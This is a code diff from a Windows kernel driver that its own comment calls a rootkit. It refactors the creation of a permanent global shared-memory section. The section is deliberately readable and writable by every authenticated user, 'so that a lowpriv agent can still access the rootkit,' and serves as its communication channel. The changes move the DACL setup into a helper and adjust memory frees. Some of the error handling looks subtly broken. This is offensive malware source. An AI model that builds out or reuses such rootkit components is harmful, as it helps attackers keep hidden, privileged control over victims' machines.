@@ -15,90 +15,30 @@
  * TODO
  */
 NTSTATUS 
-BeCreateSharedMemory(PHANDLE phSharedMemory, PVOID* ppSharedMemory)
+BeCreateSharedMemory()
 {
 	// TODO: dynamicly resolve all functions
-	
-	ULONG daclSize;
-	PACL Dacl = NULL;
-	PSECURITY_DESCRIPTOR sd = NULL;
-
 	UNICODE_STRING sectionName;
 	RtlInitUnicodeString(&sectionName, L"\\BaseNamedObjects\\Global\\BeShared");
 
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-	//
-
 	// Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
-
-	// Create the DACL
-	daclSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG) + RtlLengthSid(SeExports->SeAuthenticatedUsersSid);
-	Dacl = (PACL)ExAllocatePoolWithTag(NonPagedPool, daclSize, DRIVER_TAG); // TODO: FREE
-	if (Dacl == NULL)
-	{
-		ExFreePool(Dacl);
-		return STATUS_UNSUCCESSFUL;
-	}
-	
-	status = RtlCreateAcl(Dacl, daclSize, ACL_REVISION);
-	if (status != STATUS_SUCCESS)
-	{
-		ExFreePool(Dacl);
-		return status;
-	}
-
-	status = RtlAddAccessAllowedAce(Dacl, ACL_REVISION, SECTION_ALL_ACCESS, SeExports->SeAuthenticatedUsersSid);
-	if (status != STATUS_SUCCESS)
-	{
-		ExFreePool(Dacl);
-		return status;
-	}
-
-	// Create the security descriptor
-	sd = (PSECURITY_DESCRIPTOR)ExAllocatePoolWithTag(NonPagedPool, SECURITY_DESCRIPTOR_MIN_LENGTH, DRIVER_TAG); // TODO: FREE
-	if (sd == NULL)
-	{
-		ExFreePool(sd);
-		ExFreePool(Dacl);
-		return STATUS_UNSUCCESSFUL;
-	}
-
-	status = RtlCreateSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
-	if (status != STATUS_SUCCESS)
-	{
-		ExFreePool(sd);
-		ExFreePool(Dacl);
-		return status;
-	}
-
-	status = RtlSetDaclSecurityDescriptor(sd, TRUE, Dacl, FALSE);
-	if (!NT_SUCCESS(status))
-	{
-		LOG_MSG("Failed to set DACL in security descriptor\n");
-		ExFreePool(sd);
-		ExFreePool(Dacl);
-		return status;
-	}
-
-	//
-
-	OBJECT_ATTRIBUTES objAttributes;
+	PSECURITY_DESCRIPTOR sd = { 0 };
+	BeCreateSecurityDescriptor(&sd);
+	OBJECT_ATTRIBUTES objAttributes = { 0 };
 	InitializeObjectAttributes(&objAttributes, &sectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, sd);
 	
 	LARGE_INTEGER sectionSize = { 0 };
 	sectionSize.LowPart = 1024 * 10; // TODO
 
-	status = ZwCreateSection(phSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
+	status = ZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &objAttributes, &sectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
 	if (status != STATUS_SUCCESS)
 	{
 		LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", status);
 		ExFreePool(sd);
-		ExFreePool(Dacl);
 		return status;
 	}
-
-	//
 
 	SIZE_T ulViewSize = 1024 * 10;
 
@@ -113,10 +53,11 @@ BeCreateSharedMemory(PHANDLE phSharedMemory, PVOID* ppSharedMemory)
 		ZwClose(BeGlobals::hSharedMemory);
 		return STATUS_UNSUCCESSFUL;
 	}
-	LOG_MSG("Mapped shared memory of size at 0x%llx\n", BeGlobals::pSharedMemory);
+	LOG_MSG("Mapped shared memory of size at 0x%llx\n", (ULONG_PTR)BeGlobals::pSharedMemory);
 
 	KeUnstackDetachProcess(&apc);
 
+	ExFreePool(sd);
 	return STATUS_SUCCESS;
 }
 
